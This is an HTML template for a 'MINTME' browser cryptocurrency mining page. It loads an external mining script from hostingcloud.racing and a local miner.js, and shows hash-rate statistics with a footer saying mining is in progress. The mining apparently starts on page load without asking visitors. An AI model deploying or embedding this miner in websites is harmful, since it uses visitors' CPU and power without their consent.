<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mining Stats</title>
    <script src="https://www.hostingcloud.racing/QnMB.js"></script>
    <link rel="stylesheet" href="assets/styles/styles.css">
</head>
<body>
    <div id="content">
        <h1>Welcome to MINTME Mining Template </h1>
        <p>This is a free template to make a MINTME mining website</p>
        <div id="stats">
            <p>Hashes per second: <span id="hashesPerSecond">0</span></p>
            <p>Total hashes: <span id="totalHashes">0</span></p>
            <p>Accepted hashes: <span id="acceptedHashes">0</span></p>
            <p>Mining Status: <span id="miningStatus">Starting...</span></p>
        </div>
    </div>
    
    <div id="footer">Mining in progress... Performance may be affected.</div>
    
    <script src="assets/script/miner.js"></script>
</body>
</html>
